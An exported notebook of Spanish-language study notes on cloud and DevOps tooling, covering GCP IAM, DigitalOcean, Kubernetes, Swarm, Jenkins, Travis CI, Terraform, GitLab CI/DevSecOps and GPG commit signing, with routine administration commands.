- exportar todos los datos de facturacion a big query

# Jerarquia de recursos
- sirve para la gestion
- todo es un recurso
- se crean en:
   → organizacion, la raiz de la jerarquia de recursos, 50 cloud identities sin costo
   → Folder, modela la estructura organizacional, contenedores para proyectos y carpetas
   → proyectos, son los que tiene los recursos computacionales

# IAM
- quien, persona o subsistema que puede hacer algo en el cloud, confianza cero
- puede hacer que, referencia a los permisos, un rol es una coleccion de permisos, los roles se asignan a grupos, las politicas se pueden asignar a varios niveles, desde organizacion hasta un solo recurso
- en cual recurso

# Roles de IAM
- se asignan roles a grupos, no a usuarios
- grupos de cajon:
   → org admin, gestionan la organizacion
   → administradores de red

# Errores:
¿Qué ha pasado desde que se usa inteligencia artificial en las instalaciones de GCP?
¿Cuál es una ventaja de usar el Cloud Marketplace al armar tu solución de software empresarial?
</rich_text>
    </node>
    <node name="digital ocean" unique_id="55" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1640736033" ts_lastsave="1640809663">
      <rich_text>Digital Ocean and IaaS
- llevando la app desde la personal a la web
- la nube son servicios accesibles gracias al navegador
- IaaS, SaaS, PaaS

Cuando usarlo
- Hosting gratuito
- Shared Hosting
- VPS, servidor privado virtual, aqui es donde es usable
- Dedicado
- Cloud (PaaS/IaaS)
- Datacenter

que es un dropley?
- es la forma de llamar a lo VSP de digital ocean
- ofrece sistemas de almacenamiento que son volumenes y spaces
   → volumes, son bloques de estados solido que se pueden conectar a los droplets, se puede aumentar su espacio
   → spaces, sistemas de almacenamiento masivo para CDNs (red de entrega de contenidos)

Market place:
- maquinas ya preconfiguradas
- es importante agregar el 2FA por si cualquier cosa llegara a pasar, account, security
- se tienen codigos backup por si se llegara a perder el celular o no llegara el mensaje
- se modifica contrase;a en acess
- sshd_config para cambiar el puerto del ssh, en /etc/ssh, systemctl reload sshd

Volumes:
- particiones de disco ssd que se pueden agregar a droplets

- resize, escalamiento vertical, se agregan mas recursos internos del droplet
   → se tiene que apagar la maquina primero
   → el cambio de disco no es reversible
- tambien hay escalamiento horizontal cuando agregamos mas droplets

Networking
- se puede crear IP privadas
   → se puede usar cuando un droplet no se quiere que tenga acceso, y alguno otros nos den salida
   → para agregar la ip privada se tiene que ejecutar: lshw -class network, se busca serial y se obtiene la MAC
   → se asocia la red con la MAC en /etc/netplan/{nombre del droplet} y se agrega en ese archivo la MAC y la IP
   → floating ip, sirve para agregar mas IPs publicas
   → ICMP para hacer ping, si se quita no se sabe si esta activa

Backups y snapshots
- los backups son copias de seguridad que se general una vez al dia, cuestan un dolar al mes, son solo archivos
- los snapshots son copias exacta de como esta el droplet, son utiles cuando se hace un cambio en el SO

History y destroy
- muestra todo lo que ha pasado con el droplet
- destroy para eliminar el droplet

Tags
- las tags son una forma de agrupar todos los droplets que se tienen
- recovery, permite inicar el droplet desde una ISO
- graphs son las estadisticas de lo que se tiene en el droplet, se pueden ver los consumos

API
- se requiere un token de acceso
- manage - API
- </rich_text>
    </node>
    <node name="K8s" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1641688094" ts_lastsave="1642357493">
      <rich_text>- Bases de contenedores
   → es un namespace + cgroups + chroot
      ⇒ Namespaces: vistas de los recursos del SO
      ⇒ Cgroups: Limitan y miden los recursos del SO
      ⇒ Chroot: Cambia el root directory de un proceso
   → un pod es un grupo de contenedores
   → todos los contenedores que esten dentro de un POD comparten la misma namespace de red, tienen la misma ip de red
   → al escalar se crean copias del mismo pod
- raft consensus, si llega a pasar que se pierda el nodo master
- kubelet, crawler para revisar recursos
- kube-proxy, redirecciona a donde se tienen que ir los paquetes
- Modelos
   → declarativo
      ⇒ K8s es un sistema declarativo
      ⇒ que quiero
      ⇒ es sencillo cuando se sabe que quiere
      ⇒ todo se crea desde un spec para decribir cual es el estado deseado
   → Imperativo
      ⇒ como hacer lo que quiero
- networking
   → todo el cluster es una gran red del mismo segmento
   → todos los nodos se conectan entre si, sin nat
   → todos los pod deben conectarse entre si, sin nat
   → se usa kube-proxy
   → los pods estan en capa 3 y los servicios en capa 4
   → container networking interface
</rich_text>
      <rich_text weight="heavy">Kubectl</rich_text>
      <rich_text> es la  herramienta CLI para interactuar con el cluster de kubernetes, puede  usarse para desplegar pods de pruebas, acceder a los contenedores y  realizar algunos comandos como </rich_text>
      <rich_text family="monospace">get nodes</rich_text>
      <rich_text> o </rich_text>
      <rich_text family="monospace">get services</rich_text>
      <rich_text>
En </rich_text>
      <rich_text family="monospace">.kube</rich_text>
      <rich_text> es donde se encuentra nuestro archivo </rich_text>
      <rich_text family="monospace">config</rich_text>
      <rich_text>, la configuración de kubernetes.
 </rich_text>
      <rich_text family="monospace">kubectl get nodes</rich_text>
      <rich_text>: lista todos los nodos que tiene nuestro cluster
 </rich_text>
      <rich_text family="monospace">kubectl --config</rich_text>
      <rich_text>: puedes pasarle el archivo de configuración en caso de estar usando uno diferente.
 </rich_text>
      <rich_text family="monospace">kubectl --server --user</rich_text>
      <rich_text>: especificas la configuración sin necesidad de darle un archivo.
 </rich_text>
      <rich_text family="monospace">kubectl get nodes -a wide</rich_text>
      <rich_text>: muestra más datos de los nodos
 </rich_text>
      <rich_text family="monospace">kubectl describe nodes node1</rich_text>
      <rich_text>: da mucha información de ese nodo en especifico.
 </rich_text>
      <rich_text family="monospace">kubectl explain node</rich_text>
      <rich_text>: permite ver la definición de todo lo relacionado a ese nodo
- deployment es una estructura de mas alto nivel, sirve para manejo de versiones, permite hacer rollbacks
- canary deployment, se tiene una version de app A y app B, se mueve de poco a poco a los pods para las nuevas versiones y se envia de poco a poco el trafico para ver que se comporte estable
- replicaset es una estructura de mas bajo nivel, se asegura ue exista una cantidad de pods en determinado momento

- kubectl port-forward [service] [ports]
- los deamon set no se crean a travez del kubectl
- kubectl apply -f rng.yaml --validate=false, para no validar los problemas
- max-surge, cuantos pods se crean a partir de los que se tienen
- max-unable, a lo sumo puede a ver un 25% de pods que no esten disponibles, que esten iniciando los otros 75% estan trabajando
- al tener 25 y 25 se tiene al menos un 50% de disponibilidad
- kubectl rollout undo deploy [name]
- liveness, cuando el pod no se puede recuperar
- rediness, no muestra un error, puede ser temporal, aun no esta lista, por que esta haciendo algun otro proceso
- son de tres tipos
   → http healthcheck
   → tcp probe, intenta acceder al puerto expuesto
   → command exec, se ejecuta un comando dentro del contenedor
- para acceder a los servicios con minikube se puede usar minikube service [servicio]
- se pueden configurar por diferentes maneras
   → por linea de comando, es para algo muy especial
   → otra es por variables de entorno (env map en el spec)
   → archivos de configuracion (config maps)
- </rich_text>
      <rich_text foreground="#bbbbbb">kubectl get deploy/rng -o yaml \</rich_text>
      <rich_text>
</rich_text>
      <rich_text foreground="#bbbbbb">    | yq eval 'del(.metadata.resourceVersion, .metadata.uid, .metadata.annotations, .metadata.creationTimestamp, .metadata.selfLink, .metadata.managedFields)' -</rich_text>
      <rich_text>
- visibilidad de recursos (isolacion), tipo de recurso, nombre y namespace donde vive
- </rich_text>
      <rich_text family="monospace">kubectl config set-context --current --namespace=blue</rich_text>
      <rich_text>
- namespaces
   → no provee aislacion de recursos, se usan network policies
   → un pod en A se puede conectar con B
   → desde cualquier pod en el cluster nos podemos comunicar con api del K8s
- la forma para desplegar diferentes versiones en un cluster es:
   → es usar otro namespace
- autenticacion y autorizacion
   → la autenticacion se hace por certificados TLS, bearer tokens, basic auth o proxy
   → si no pasa la auth regresa un 401
   → si no es aceptado, el usuario es anonimo
   → un usuario anonimo no puede hacer ninguna operacion
- services account tokens
   → sistema de auth de kubernetes
   → pueden crearse, eliminarse y actaulizarce
   → estan asociados a secretos
   → se usan para otorgar permisos a app y services
   → kubectl get sa default, nos da el secret
- RBAC
   → un role es un objeto con lista de rules
   → un rolebiding asocia un rol a un usuario
   → pueden existir usuarios, roles y rolebidings con el mismo nombre
   → es buena practica es tener 1-1-1 bidings
   → un pod pude estar asociado a un service account

Errores:
¿Dónde se guarda la configuración del cluster de kubernetes?
Los rolebiding son recursos que:
-- asocia un usuario a un rol
¿Cuál es el namespace utilizado por kuberentes para uso administrativo?
-- kube-system
Utilizando un maxSurge y MaxUnavailable del 25% con 3 replicas. ¿Cuál es la cantidad máxima de contenedores que pueden haber corriendo en un momento determinado?
Un DaemonSet se utiliza principalmente para..

-- K8S in GCP
- un servicio sirve para conectar un servicio con otros, o con el mundo exterior
   → Cluster IP, se enfoca a unir microservicios en la misma infraestructura
   → Node Port, permite tener diferentes pods en diferentes nodos, donde se da un mapeo de un puerto
   → Load balancer, se crean para usar con los Node port, administra el trafico para cada uno de los pods
- archivos descriptivos
   → estan en yaml
   → describen la parte logica del app, pods, deployment, services
   → no se describen clusters ni nodos
   → partes
      ⇒ kind
      ⇒ apiVersion
      ⇒ metadata
      ⇒ spec
- labels
   → metadata arbitraria, se peuden poner los nombres que sean para dar una identidad
   → son queryable, para busquedas y seleccion
- selectores
   → son para usar los labels para saber cuando usar unos u otros pods en los despliegues
- namespaces
   → separacion virtual dentro del cluster
   → se puede hacer aislamiento de los datos
   → por defecto
      ⇒ default
      ⇒ kube-system, administracion de k8s
      ⇒ kube-public, tambien es para administracion
- deployments
   → blue-green
      ⇒ tecnica de despliegue de aplicacion con zero downtime
      ⇒ dos ambientes exactamente iguales
      ⇒ solo un ambiente sirve el trafico de produccion
   → canary
      ⇒ sirve para testear nuevas funcionalidades
      ⇒ se despliega una version en produccion a un numero reducido de usuarios
- volumen
   → disco persiste
   → nfs
   → cluster
   → -- sistemas de almacenamiento de las nubes
- apps stateful
   → son aplicaciones que guardan el estado de los datos
   → son
      ⇒ bases de datos
      ⇒ datawarehouse
      ⇒ modelos predictivos
      ⇒ gestores documentales
   → con
      ⇒ pods
      ⇒ volumenes
      ⇒ servicios de tipo cluster IP
   → mayor seguridad al ser una red interna
- Istio, service mesh
   → red para servicios
   → permite fortalecer las politcas de comunicacion en K8s
   → manejo de redes dividos por subredes
   → roles. control de trafico, seguridad y fortalecimiento de las politicas
   → istio es un producto para bajar la complejidad del service mesh
      ⇒ caracteristicas
         • service discovery
         • seguridad
         • instrumentacion
         • rutas dinamicas
         • telemetria
- stackdriver
   → es para monitores, log aggregation y alerting con GCP
- CI/CD
   → google cloud buider
   → maneja cloud repository
   → contauner registry
- knative
   → solucion opensource
   → servicio serverless para contenedores
   → permite escalar
- buenas pracrticas
   → contenedores peque;os
   → organizar despliegues en namespaces
   → configurar los health checks
   → configurar limites en el numero de peticiones
   → terminar con gracia</rich_text>
    </node>
    <node name="swarm" unique_id="58" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1641578803" ts_lastsave="1641672202">
      <rich_text>- Routing mesh
   → multiple tareas de un servicio corriendo y que se puede acceder por el mismo puerto
- PORT: </rich_text>
      <rich_text family="monospace">--publish published=8080,target=80</rich_text>
      <rich_text>
- NODE: </rich_text>
      <rich_text family="monospace">--constraint node.labels.region==east</rich_text>
      <rich_text>, </rich_text>
      <rich_text family="monospace">-e constraint:node==csx00153</rich_text>
      <rich_text>
- STACK: docker stack deploy {file} name, docker stack rm app
- Productivo:
   → rotacion de leader
   → los lideres siempre tiene que ser impares
   → para productivo son minimo 3
- herramientas
   → traeffic
   → portainer
- Productivo
   → house kipping, mantenimiento en espacio en disco
   → meltwater/docker-cleanup, modo global sirve para que este en todos los nodos</rich_text>
    </node>
    <node name="jenkins" unique_id="60" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1642111509" ts_lastsave="1642118638">
      <rich_text>- Automatizacion
   → para reproducir procesos y nos de mayor productividad
   → que se puede automatizar
      ⇒ pruebas
      ⇒ deployment
      ⇒ verificacion (smokes)
      ⇒ ... cualquier cosa que sea programable
- Jenkins
   → herramienta opensource
   → esta echo en java
   → se puden escribir los plugins propios en java
   → permite escalar de manera vertical (una maquina) y horizontal (varias maquinas)
   → los jobs se pueden escribir en codigo
- Usarios
   → deben de ser unico
   → por temas de auditoria no se debe de usar uno
- jobs
   → la unidad mas importante dentro de jenkins
   → controlado por el build executer
   → se pueden borrar un build
   → el build es una ejecucion de un job
   → se pueden “schedular”
   → se descartan archivos y folders para no tener lleno el disco
- core jenkins
   → jenkins usa las herramientas que estan disponibles en la maquina
   → jenkins lo lee con el filesystem, para eso debe de tener los permisos necesarios
- ecosistema de plugins
   → unidades que extienden a jenkins
   → se pueden poner x versiones de lenguajes para hacer los builds
- cadenas de jobs
   → parameterized trigger plugin
   → watchers
      ⇒ ejecuta otras acciones
   → parameters
      ⇒ ejecuta con parametros
- github
   → se tiene que autoregistrar el hook en jenkins
- freestyle project
   → los mas comunes, fue con los que empezo jenkins
- pipeline
   → scripting pipeline
   → declarative pipeline
      ⇒ agent any, sirve para que se corra en donde sea
      ⇒ se crea a partir de un archivo estilo json
      ⇒ stages para cada paso que se requiere
      ⇒ se comporta muy parecido a un build_spec.yml
- como se puede acelerar?
   → pipeline syntax, en smple steps
   → en replay se puede ver cuanto se tarda sin hacer commit a git
- jenkins slaves
   → permite correr jobs distribuidos
   → conectandolo -- se tiene que entrar al jenkins master
      ⇒ por medio de ssh
      ⇒ en el slave se guarda la llave
      ⇒ se usan authorized_keys
      ⇒ en el master en mange jenkins
         • manage nodes
         • nombre, directorio remoto
         • los executors deben de ser iguales en master que en slave
         • ip o dns

¿Por qué debo tener tiempos de espera en mis “builds”?
Los plugins me ayudan a instalar herramientas exclusivas para Jenkins.</rich_text>
    </node>
    <node name="travisCI" unique_id="61" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1642357503" ts_lastsave="1642805775">
      <rich_text>- travis CI
   → en teoria opensource
   → ya no existe la version free, solo por 30 dias
- se usa npm init. para generar un documento automatizado
- src para el codigo
- archivo: .travis.yml
- se establece el lenguaje: language: {lenguaje}
- sistema operativo, el default es linux, os: {nombre del os}
- configuraciones mas profundas
   → git: depth: 3
- branches: except: - legacy, - experimental...
- branches: only: - master, -stable ...
- before_install: - python
- install: - yarn install
- script: - yarn deploy, - yarn test
- before_script: - yarn test
- after_script: - yarn clean
- cache: directories: - node_modules
- jobs: include: - stage: test..script: yarn test, se pueden ejecutar varios script dentro de cada stage
- deploy: configuraciones dependiendo del caso, se requiere la doc
- el cache en el caso de node generalmente se dejar node_modules y .npm
- para deploy se requiere: 
   → provider: pages
   → un github-token
   → el local-dir
   → target-branch: {branch}
   → on: donde debe de ser el cambio para que se active el trigger
- para mandar notificaciones se agrega notification antes del deploy
   → email: recipients: - user1, - user2, on_success: always, on_failure:always
- para slack se puede agregar un app, que es travis_ci
   → nos da el acceso a la configuracion
- Buenas practicas
   → se deben de cifrar los datos sensibles con travis-cli, travis encrypt llave
- terraform validate para comprobar, terraform init para inicializar el entorno
- terraformplan -var-file {archivo}, terraform apply, -auto-approve para que no pregunte
- cuando se tiene el auto.tfvar, se interpreta este directamente
- dynamics: dynamic “ingress” {"se puede iterar sobre un objeto": for_each = var.ingress_rules / content{valores}}, el item es sobre el nombre del dynamic: ingress.value.from_port
- un recurso se llama asi: "${nombre_tf.donde.propiedad}
- los output se ponen:
   → output “varibale” {value=aws_instace.platzi-instace.*.public_ip}
- Terraforma sabe que infraestrucutar crea
   → maneja el estado de almacenaje de conficuraciones, terraform.tfstate, puede ser local y remoto</rich_text>
    </node>
    <node name="IaC" unique_id="62" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1642640986" ts_lastsave="1642985336">
      <rich_text>- utilizar archviso de definicion
- sistemas y procesos autodocumentados
- versionar las coas
- preferir cambios peque;os
- mantener los servicios continuamente disponibles
- herramientas:
   → archivos de definiciones de aconfiguraciones, se usan muhco para la infraestructura
   → herramientas para configuracion de servidores, sirven apra configurar los servidores
   → aprovisionamiento, tener el recurso ya listo
- enfoques para gestion de servidores
   → configuracion de servidores
   → empequetar plantillas de servidores
   → ejecutar comando en los servidores
   → configuracion desde un registro central
- como elegir herramienta
   → modo desatendido para herramientas de lineas de comando
   → idempotencia
   → parametrizable
- configuradores: ansible, chef, puppet
- infraestructura -&gt; dependencias -&gt; app/datos
- beneficios
   → creacion rapida bajo demanda
   → automatizacion, creacion y configuracion sin intervencion humana
   → ambientes homogeneos
- Terraform
   → creada en go
   → por hashicorp
   → permite crear infraestructura por codigo
   → no solo se conecta a nubes publicas sino tambien privadas
   → tiene planes de ejecucion
   → facil de automatizar
- gestion de conf vs creacion de infraestructura
   → ansible nos permite crear el estado de la infra, nos permite crearla pero no es su funcion principal
   → infra mutable vs infra inmutable
      ⇒ mutable: cuando el estado del servidor cambia
      ⇒ inmutable: se destruye un servidor y se crea uno nuevo con los cambios
   → lenguaje declarativo vs procedural
      ⇒ declarativo, se dice a las herramientas que hacer
      ⇒ procedural: se dice como hacerlo

## Rasgos
- provider
- resources

## Packer
- permite la creacion de amis personalizadas
- elementos
   → tipo json
   → seccion de variables
   → builders, se decide de donde se construye la imagen
   → provisioners, se personaliza la imagen'
   → post-processors: para manipular la imagen despues de crearse, se ejecuta dentro de la maquina
- se crea un archivo con el nombre credentials, de la forma tradicional para aws
- packer validate para validar la sintaxis
- packer build nombre-del-archivo para ejecutar

## Terraform
- variables descriptivas
- se pueden omitir los valores en la declaracion de variables
- manejo de lenguaje HCL
- por buena practica se define primero el provider, pero no es obligatorio
- terraform validate, para validar la sintaxis, terraform init, para iniciar el entorno, terraform plan, para visualizar que recursos se van a crear, terraform apply para crear la infraestructura
- argumento -var-file {archivo de var}, para pasarle el archivo de variables
- -auto-approve para no tener interaccion con terraform
- si el archivo se llama prod.auto.tfvar, por automatico toma este archivo para las variables
- el nombre del recurso y del objeto no deben de ser igual para que funcione
- para parametrizar se puede usar “dynamic”
   → dynamic “recurso o segmento” { for_each = variable, content { llave: “recurso o segmento”.value."nombre" } }
   → para llamar otro recurso se usa ${nombre.propiedad.valor}
   → los output se manejan: output “nombre” { value = tipo.nombre.*.valorRecurso }
- Archivos de estados
   → terraform sabe que infraestructura crea
   → local, terraform.tfstate, en estado json guarda toda la informacion de lo que creo, si se borra terraform ya no sabe que paso
   → backend, permite almacenar el estado de forma remota a traves de backends (buckets)
   → ayuda para trabajar en equipo
   → mayor disponibilidad
   → para convifurar el backend se necesita:
      ⇒ terraform { backend “tipo” {bucket = “nombre bucket”, key = “como se llamara el archivo”, region="region" } }
- Cifrado del bucket,
   → en el archivo de configuracion:
      ⇒ manejo y creacion de un KMS
      ⇒ se agrega una nueva regla al bucket, con server side encryption
   → en el backend, se agrega el valor encrypt = true, kms_key_id = arn de la key
- versionar es bueno tambien para la IAC
- se puede separar por modulos
- para craer un modulo:
   → module “nombre del modulo”
   → source = “directorio donde se encuentran los modulos”
   → para las variables se tienen que referenciar, nombre=var.nombre
   → las variables deben de estar en la carpeta donde esta el modulo
   → se debe agregar el provider para ue funcione
- modulos remotos, se hace por medio de control de versiones
   → se versiona haciendo de los modulos a git init
   → en el source que se tiene en app, se cambia el nombre de la carpeta por el nombre del repositorio + carpeta de donde esta
- provisioner, permite configurar servidores despues de crearlos, permite conectarse via remota: provisioner “remote-exec” {connection {type = “ssh”, user = “”, private_key = “archivo”, host = self.public_ip}, inline = [comandos]}
- con 0 y -1 se le dice que me puedo conectar a cualquier protocolo con cualquier puerto</rich_text>
    </node>
    <node name="full-course" unique_id="68" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1643840042" ts_lastsave="1643840910">
      <rich_text>- less Dockerfile
- se crea usuario devops
- su - devops &amp;&amp; ssh-keygen -t rsa
- docker run -itd --privileged --name servera centros7ss
- docker inspect servera
- ssh devops@192.17.0.3
- se requiere ser el mismo usuario devops</rich_text>
    </node>
    <node name="Devops y Gitlab" unique_id="67" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1643838980" ts_lastsave="1645722537">
      <rich_text>-----


# Planificacion
- Agile
   → proceso iterativo
   → uso de spints
      ⇒ se define al alcance
      ⇒ hacemos pruebas
      ⇒ generamos artefactos
      ⇒ release
      ⇒ se vuelve a definir
- Waterfall
   → proceso previamente definido
   → se entrega hasta el final del proyecto
   → se crean la doc mucho antes
   → modelo secuencial
      ⇒ se define el proyecto
      ⇒ build del proyecto
      ⇒ test
      ⇒ release
- Issues
   → empieza una conversacion al rededor del codigo
   → permiten empezar a colaborar sobre una idea antes de codificar
   → sugerir propuestas
   → hacer preguntas
   → reportar bugs y soporte
   → nuevas implementaciones
   → se pueden crear templates para estandarizar
- labels
   → se usa para clasificarlos
   → sirve para filtar y buscar en gitlab
   → permite seguir temas a traves de notificaciones
   → tipos aqui se anaden tambien las eitquetas:
      ⇒ grupo
      ⇒ proyecto
   → ya estan en infromacion del proyecto... cambio
- milestones
   → permite agrupar issues para alcaznar un objetivo determinado en un tiempo especifico
   → agrupador de releases para los clientes
   → burndown chart, se require varios dias de desarrollo
- boards
   → son una forma de visualizar los flujops de trabajo
   → es una de las herramientas de planificacion mas importante de gitlab
   → columnas que agrupan issues por labels
      ⇒ crear labels: ToDo, Doing, Review
- service desk
   → capacidad de abrir issues a traves de correo electronico
   → soporte para los clientes
   → permite para que el equipo no tecnico abra issues o bugs
   → se crea un correo unico para el proyecto cuando se activa
- Merge requests
   → son parte importante para devops, es puerta de la entrada de codigo
   → es la base de colaboraion de gitlab
   → para saber
      ⇒ si se resolvio
      ⇒ si el performance se reduce
      ⇒ si el codigo es seguro
      ⇒ si las nuevas librerias usan licencias abiertas o cerradas
   → deberian de ser de pocos archivos
- CI
   → automatizacion es fundamental
   → es una practica en la que devs manda sus cambios, detona builds y pruebas
   → ayuda a encontrar bugs
   → aumenta la velocidad de releases
   → automatiza el pipeline que lleva el codigo de local a prod
   → hub central ded automatizacion
   → construye, prueba y despliega cambios paquenios en codigo
   → se configura con .gitlab-ci.yml
   → tambien se tiene CDelivery y Cdeployment
      ⇒ en delivery siempre se tiene un artefacto listo para enviar a prod
      ⇒ en deployment se actualiza continuamente el flujo con los cambios
      ⇒ review app, para buena practica, son pruebas en prod por cada branch
   → </rich_text>
      <rich_text link="webs https://gitlab.com/neimv/platzi-devops/-/ci/lint">https://gitlab.com/neimv/platzi-devops/-/ci/lint</rich_text>
      <rich_text>
- github pages
   → hosting estatico
   → integracion con gitlab ci
   → dominios personalizados
- Desarrollo agil
   → capacidad de responder al cambio
   → es un framework basado en 12 reglas
   → manejo de cambios con exito
- Autodevops
   → permite crear un flujo de devops inmediato con la creacion del proyecto
   → se corren analisis estaticos y dinamicos de seguridad
   → requisitos
      ⇒ gitlab runner
      ⇒ kubernetes
      ⇒ base domain
      ⇒ prometheus
   → nosotros podemos crear
      ⇒ dockerfile
      ⇒ .gitlab-ci.yml
      ⇒ Variables
- container registry
   → cuando se hace un build se genera una imagen de docker
   → empaquetado de codigo
   → permite almacenar imagenes de docjer
   → cada que se creat un build la nueva imagen se envia al container registry
- DevSecOps
   → el equipo de seg trabajaba aislado y ejecutaba al final del proceso
   → no habia problemas en esos entonces
   → es pensar en la seguridad en app y en infra
   → trata de automatizar la seguridad e incluirla en el ciclo de vida de la app
   → devsecops manifiest:
      ⇒ los datos y la ciencia de la seguridad siempre anteponer ante el miedo insertidumbre y duda
      ⇒ los scores de seguridad debn de ser automatizados
      ⇒ el monitoreo tiene que ser 24/7
      ⇒ se deben de cerrar todas y cada una de las puertas abiertas
- firmas de seguridad
   → GPG
      ⇒ permite identificar en los commit
      ⇒ anade una capa adicional de seguridad a git
      ⇒ gitlab despliega un banner junto a los commits, para mostrar que dichos commits estan verificados
- pruebas estaticas de seguridad
   → buscan en los archivos, patrones inseguros de codigo
   → verifica que no halla secrets en el codigo
   → crea reportes
   → utiliza la imagen de docker sst de gitlab
   → tipos de vulnerabilidades
      ⇒ criticas
      ⇒ altas
      ⇒ medianas
      ⇒ bajas
      ⇒ desconocidas
   → de acuerdo a las vulnerabilidades se puede saber que hacer para que no afecte
   → diferentes herramientas para el escaneo
- escaneo ded contenedores
   → clair y clair-scanner para verificar contenedores
   → se pueden omitir vulnerabilidades con el archivo clair-whitelist.yaml
- escaneo de dependencias
   → analiza estaticamente las dependencias del proyecto
   → genera reportes
   → utiliza docker dependency scanning de gitlab
   → include: template: dependency-scanning.gitlab-ci.yaml
- pruebas dinamicas de seguridad
   → asume que hay un atacante exetrno
   → utiliza OWSAP ZAP proxy y ZAP basline
   → correa analisis pasivo
   → genera reporte con el merrge request
   → solo corre pruebas pasivas
      ⇒ no uso de cokies inseguras
      ⇒ JS sin acceso a cookies
   → DAST.gitlab-ci.yaml
- gitlab security dashboard
   → es un hub centralizado donde se pueden ver las vulnerabilidades de prod
   → permite acceder rapidamente a los riesgos detectados
   → permite validar vulnerabilidades como invalida o no ap[licable
   → genera vinculos a los reportes de seguridad
   → esta en project-&gt; security dashboard
- CD
   → continuos delivery, siempre listo para mandar a prod un artifact
   → continuos deployment, directo a produccion el codigo
   → se puede poner en riesgo directo a prod con bugs o con downtime
   → feature flags para activar diferentes features en codigo en prod
   → sla, son contratos firmados donde se debe tener cierto downtime
      ⇒ aqui entran los SRE, que basicamente ponen freno a los deployment, para no incumplir
      ⇒ gitlab contiene diferentes tipos de estrategias
         • se pueden usar variables de ambiente
         • se tiene un CI/CD
         • 3 tipos de estrategias
            ◇ rapidamente se manda el codigo a prod
            ◇ se manda continuamente pero no se activa en todos los pods, se activa de poco en poco
            ◇ se manda a staging primero y a prod se envia manualmente
- Ambientes
   → permiten realizar pruebas en diferentes ambientes
   → lo mas normal es:
      ⇒ prod
      ⇒ stage
      ⇒ dev
      ⇒ local
   → hay 3 tipos
      ⇒ estaticos, no cambian, es la misma infraestructura
      ⇒ dinamicos, se puede crear un ambiente por cada branch de desarrollo
      ⇒ protegidos, ambientes donde se definen ciertas personas que pueden hacer deployment a estos ambientes
   → se pueden definir usando el keyword, enviroment, se puede poner nombre y url, y cuando se hacen los deployment, manuales o automaticos
   → la variable de REPLICAS puede crear varias insatancias (pods)
- Review apps
   → permite ver los cambios de un feature branch
   → los disenadores y PM pueden ver los cambios sin necesidad de levantar un ambiente local
   → el merge request es aprobado el feature branch se borra, se detiene el review app y se destruye la infra
   → generan un ambiente completo por cada branch
   → se tienen dos job distintos
      ⇒ uno genera el ambiente y hace el deploy, para borrar el branche se necesita un on_stop: stop_review
      ⇒ el otro es stop_review
- rollback
   → algunas veces pasan cosas que no pensabamos que iban a pasar
   → mas complejo es mas dificil de entender
   → permite automatizar el regreso a ambientes libres de bugs
- monitoreo
   → antes no se preocupaba muhco, el codigo era estatico
   → casi no se tenian cambios anteriormente
   → se volvio indispensable con devops
   → se obtiene la visibilidad de la salud y el performance del equipo
   → todos los ambientes se monitorean
   → familiarizarce con las metricas
   → automatizar el monitoreo
      ⇒ se debe generar alertas cuando algo falla
      ⇒ esto para prevenir que el ambiente caiga
   → compartir datos
      ⇒ reportes
      ⇒ accesos privilegiados
   → monitoreo de apps, infra y equipo
   → cuando se establecen metricas, el ser humano se dedica a maximizar esas metricas
- performance metrics
   → nos dan una idea de que tanto esta creciendo la infra y que capacidad de respuesta se tiene
   → se da una idea de como afinar un workload o una query
- health metrics
   → permite entender si la infra esta a punto de fallar
      ⇒ cuando la memoria o cpu esta llegando al limite de lo que se esperaba
   → se permite generar alertas para cada metrica
      ⇒ generalmente se quieren tener buenas metricas de performance, pero las de salud tambien son importantes
- metricas de equipo
   → cycle analytics
   → lenguajes de programacion
   → commits por dia, semana, mes, hora
   → pipelines existosos
   → contribuciones personales del equipo
   → git timeline
   → ahora es value stream
- rastro de errores
   → se debe generar el stack trace para saber donde esta fallando
   → para esto se maneja sentry
   → 



---
</rich_text>
      <rich_text family="monospace"># know if gpg is installed
which gpg

# install gpg with brew
brew install gpg

# installa pineentry mac (pgp handler)
brew install pinentry-mac

# generate key
gpg --full-gen-key
# 1. select algorith (RSA and RSA for default)
# 2. select keysize (the longer the better)
# 3. specify key time validation (1 year could be fine)
# 4. Fill out your personal data. Email must the same as your GitLab account mail

# list keys
# GPG key ID -&gt; that starts with sec i.e. rsa4096/&lt;GPG-key-ID&gt;
gpg -k --keyid-format LONG
gpg --list-secret-key --keyid-format LONG
gpg --list-secret-key --keyid-format LONG &lt;your-email&gt;

# export the public key and add to GitLab (User Settings &gt; GPG Keys)
gpg --armor --export &lt;GPG-key-ID&gt; | pbcopy

# configure git to use the public key to sign commits
git config --global user.signingkey &lt;GPG-key-ID&gt;
git config --global gpg.program gpg

# commit with -S flag to sign
git commit -S -m "My signed commit"

# or tell Git to sign your commits automatically
git config --global commit.gpgsign true


# DELETE GPG KEYS

# first delete private key
gpg --delete-secret-key key-ID

# then delete public key
gpg --delete-key key-ID </rich_text>
      <rich_text>

---
devops avanzado
- Implementacion de pruebas
   → sin pruebas no hay confianza
   → correr test manualmente no se debe de hacer
   → unit + integration + acceptance
   → unit test using mocks
   → integration test usan dependencias reales con fixtures
   → acceptance test usan un ambiente con todos los servicios, muy parecido a prod
- Continuos integration y artifacts
   → empieza con git
   → unit test
      ⇒ sirve como historial
      ⇒ saber que ocurrio, como y quien
   → code analysis
      ⇒ se debe de tener codigo limpio
      ⇒ codigo seguro
   → test coverage
   → release
   → la salida de un CI es un artifact
   → en auditoria se puede llegar a pedir hasta un año de artifacts
   → tiene mas alcance un integration test que un unit test
   → se requiere que el codigo tenga un X porcentaje de pruebas, puede ser bueno y malo a la vez
